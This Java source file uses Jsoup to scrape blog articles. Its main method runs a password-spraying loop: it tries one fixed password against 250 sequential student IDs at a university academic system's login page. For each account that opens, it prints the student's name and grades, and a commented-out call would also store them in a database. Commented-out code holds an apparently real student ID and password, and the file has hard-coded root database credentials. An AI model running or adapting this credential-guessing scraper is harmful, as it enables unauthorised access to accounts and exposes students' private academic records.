package com.edu.fulinhua;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.util.Map;
import java.util.regex.Pattern;

//import org.apache.http.client.CookieStore;
/**
 * Created by fulinhua on 2016/12/18.
 */
public class test{

//    public static void main(String[] args) throws ClientProtocolException,IOException {
//        String loginurl="http://219.219.120.48/jiaowu/login.do";
//        String username="141250036";
//        String password="mangguo";
//       System.out.println(test.posturl(loginurl,username,password));
//    //    testPost(loginurl,username,password);
//    }

    private static String url = "http://blog.csdn.net";
   private static String blogName = "guoxiaolongonly";

    public test() throws IOException {
    }

    public static void getArticleListFromUrl(String listurl) {
        Document doc = null;
        try {
            doc = Jsoup.connect(listurl).userAgent("Mozilla/5.0").timeout(3000).post();
        } catch (IOException e) {
            e.printStackTrace();
        }
        // System.out.println(doc);
        Elements elements = doc.getElementsByTag("a");//找到所有a标签
        for (Element element : elements) {
            String relHref = element.attr("href"); // == "/"这个是href的属性值，一般都是链接。这里放的是文章的连接
            String linkHref = element.text();
            //用if语句过滤掉不是文章链接的内容。因为文章的链接有两个，但评论的链接只有一个，反正指向相同的页面就拿评论的链接来用吧
            if (!relHref.startsWith("http://") && relHref.contains("details") && relHref.endsWith("comments"))
            {
                StringBuffer sb = new StringBuffer();
                sb.append(url).append(relHref);
                System.out.println(sb.substring(0, sb.length() - 9));//去掉最后的#comment输出
                getArticleFromUrl(sb.substring(0, sb.length() - 9));//可以通过这个url获取文章了
            }
//          System.out.println(linkHref);
            if(linkHref.equals("下一页"))//如果有下一页
            {
                getArticleListFromUrl(url + relHref);//获取下一页的列表
            }
        }

    }

    public static void getArticleFromUrl(String detailurl) {
        try {
            Document document = Jsoup.connect(detailurl).userAgent("Mozilla/5.0").timeout(3000).post();
            Element elementTitle = document.getElementsByClass("link_title").first();//标题。 这边根据class的内容来过滤
            System.out.println(elementTitle.text());
            String filename = elementTitle.text().replaceAll("/", "或");
            Element elementContent = document.getElementsByClass("article_content").first();//内容。
            System.out.println(elementContent.text());
            // String Content =elementContent.te  xt().replaceAll(" ", "\t");
            // System.out.println(elementContent.text()+"\n");
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    public static void insert(long sid,String name,String course,double point){
        try {
            Class.forName("com.mysql.jdbc.Driver");     //加载MYSQL JDBC驱动程序
            //Class.forName("org.gjt.mm.mysql.Driver");
            System.out.println("Success loading Mysql Driver!");
        }
        catch (Exception e) {
            System.out.print("Error loading Mysql Driver!");
            e.printStackTrace();
        }
        try {
            PreparedStatement pstmt=null;
            java.sql.Connection con = DriverManager.getConnection(
                    "jdbc:mysql://localhost:3306/newtable","root","root");
            //连接URL为   jdbc:mysql//服务器地址/数据库名  ，后面的2个参数分别是登陆用户名和密码

            System.out.println("Success connect Mysql server!");
            //  Statement stmt = con.createStatement();
            String sql="insert into grade(sid,name,course,point) values(?,?,?,?)";
            pstmt=con.prepareStatement(sql);
            pstmt.setLong(1,sid);
            pstmt.setString(2,name);
            pstmt.setString(3,course);
            pstmt.setDouble(4,point);
            pstmt.executeUpdate();
            pstmt.close();
            con.close();

        }
        catch (Exception e) {
            System.out.print("get data error!");
            e.printStackTrace();
        }
    }


    public static void main(String[] args) throws IOException {


        for (int i = 141250000; i < 141250250; i++) {
            String username = i + "";
            String password = "abcdefghijklmn";
            //System.out.println(username);
            Connection.Response res = Jsoup.connect("http://219.219.120.48/jiaowu/login.do")
                    .data("userName", username, "password", password)
                    .method(Connection.Method.POST)
                    .execute();
            Map cookies = null;
            if (res.statusCode() == 200) {
                cookies = res.cookies();
                //  System.out.println(cookies);
            }


            Document doc = res.parse();
//这儿的SESSIONID需要根据要登录的目标网站设置的session Cookie名字而定
            String sessionId = res.cookie("user_id");
//        Elements elements = doc.getElementsByTag("a");//找到所有a标签
//        for (Element element : elements) {
//            String relHref = element.attr("abs:href"); // == "/"这个是href的属性值，一般都是链接。这里放的是文章的连接
//            String linkHref = element.text();
//           System.out.println(relHref);
//        }
//
            Document gradedoc = Jsoup.connect("http://219.219.120.48/jiaowu/student/studentinfo/achievementinfo.do?method=searchTermList")
                    .cookie("JSESSIONID", res.cookies().get("JSESSIONID"))
                    .get();

            Document personinfo = Jsoup.connect("http://219.219.120.48/jiaowu/student/studentinfo/studentinfo.do?method=searchAllList")
                    .cookie("JSESSIONID", res.cookies().get("JSESSIONID"))
                    .get();

            //   System.out.println(res.cookies().get("JSESSIONID"));

            Elements elements = gradedoc.getElementsByTag("TABLE").get(0).getElementsByTag("table");//找到所有a标签
            if (elements.size() > 2) {//登陆成功
                String name = personinfo.getElementsByClass("TABLE_TD_01").get(1).text();
                System.out.println(username+" "+personinfo.getElementsByClass("TABLE_TD_01").get(1).text());
                Element element = elements.get(elements.size() - 1);
                Elements trs = element.select("tr");
                trs.remove(0);
                for (Element tr : trs) {
                    Elements tds = tr.select("td");
                   // System.out.println(tds.get(2).text() + " " + tds.get(6).text());
                 //   if(isDouble(tds.get(6).text()))
                   // insert(Long.parseLong(username),name,tds.get(2).text(),Double.parseDouble(tds.get(6).text()));
                }
                // System.out.println(gradedoc.body());
            }
        }

//    String username="141250036";
//        String password="mangguo";
//        Connection.Response res = Jsoup.connect("http://219.219.120.48/jiaowu/login.do")
//                .data("userName", username, "password", password)
//                .method(Connection.Method.POST)
//                .execute();
//        Map cookies = null;
//        if (res.statusCode() == 200) {
//            cookies = res.cookies();
//          //  System.out.println(cookies);
//        }
//
//
//        Document doc = res.parse();
////这儿的SESSIONID需要根据要登录的目标网站设置的session Cookie名字而定
//        String sessionId = res.cookie("user_id");
////        Elements elements = doc.getElementsByTag("a");//找到所有a标签
////        for (Element element : elements) {
////            String relHref = element.attr("abs:href"); // == "/"这个是href的属性值，一般都是链接。这里放的是文章的连接
////            String linkHref = element.text();
////           System.out.println(relHref);
////        }
////
//        Document gradedoc = Jsoup.connect("http://219.219.120.48/jiaowu/student/studentinfo/achievementinfo.do?method=searchTermList")
//                .cookie("JSESSIONID", res.cookies().get("JSESSIONID"))
//                .get();
//
//        Document personinfo = Jsoup.connect("http://219.219.120.48/jiaowu/student/studentinfo/studentinfo.do?method=searchAllList")
//                .cookie("JSESSIONID", res.cookies().get("JSESSIONID"))
//                .get();
//
//        //   System.out.println(res.cookies().get("JSESSIONID"));
//
//        Elements elements = gradedoc.getElementsByTag("TABLE").get(0).getElementsByTag("table");//找到所有a标签
//        if (elements.size() > 2) {//登陆成功
//         String name=personinfo.getElementsByClass("TABLE_TD_01").get(1).text();
//            System.out.println(personinfo.getElementsByClass("TABLE_TD_01").get(1).text());
//            Element element = elements.get(elements.size() - 1);
//            Elements trs = element.select("tr");
//            trs.remove(0);
//            for (Element tr : trs) {
//                Elements tds = tr.select("td");
//                System.out.println(tds.get(2).text() + " " + tds.get(6).text());
//            }
//            // System.out.println(gradedoc.body());
//        }
//
//
//    }

    }

    private static boolean isDouble(String str) {
        if (null == str || "".equals(str)) {
            return false;
        }
        Pattern pattern = Pattern.compile("^[-\\+]?[.\\d]*$");
        return pattern.matcher(str).matches();
    }


}